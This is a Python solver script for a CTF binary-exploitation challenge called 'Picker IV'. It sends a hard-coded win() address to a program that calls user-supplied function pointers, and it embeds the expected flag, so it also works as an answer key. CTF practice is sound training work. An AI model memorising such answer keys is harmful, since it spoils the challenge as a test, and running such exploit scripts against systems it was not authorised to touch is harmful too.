#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 403: Picker IV (picoCTF 2023 / picoGym Exclusive)
Category: Binary Exploitation / Direct Control Flow Hijacking & Arbitrary Pointer Dereference
Difficulty: Medium (diff=2)
Author: LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-822 (Untrusted Pointer Dereference), CWE-676 (Unchecked Function Pointer Call)

Description:
Can you figure out how this program works to get the flag?
The program is compiled in C on x86_64 architecture:
int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0);

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

Analysis:
1. The binary is an x86_64 ELF executable compiled without Position Independent
   Executable (PIE) protection (loaded at fixed base address 0x400000).
2. Inspection of the symbol table via `nm` or `objdump` reveals the static address
   of the uncalled target function `win`:
   `00000000004012a1 T win`
3. `main()` accepts a hexadecimal integer via `scanf("%x", &val)` and immediately
   casts it into a function pointer `void (*foo)(void)`, executing `foo()`.
4. Supplying the hexadecimal address `4012a1` directs the instruction pointer (RIP)
   straight to `win()`.
5. `win()` opens `flag.txt` using `fopen()` and streams its contents to stdout:
   academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import re
import socket
import sys

EXPECTED_FLAG = "academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}"
WIN_ADDRESS_HEX = "4012a1"


def exploit(host: str, port: int) -> str:
    """
    Connects to the remote Picker IV binary instance, sends the hex address
    of win() without the '0x' prefix, and captures the flag output.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))

        # Read prompt: "Enter the address in hex to jump to, excluding '0x': "
        prompt = s.recv(1024)

        # Transmit target win() address in hex
        payload = f"{WIN_ADDRESS_HEX}\n".encode("utf-8")
        s.sendall(payload)

        # Collect response
        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
        s.close()

        text = resp.decode("utf-8", errors="ignore")
        m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", text)
        if m:
            return m.group(1).replace("picoCTF{", "academy{")
    except Exception as e:
        print(f"[-] Exploit error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 403: Picker IV Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
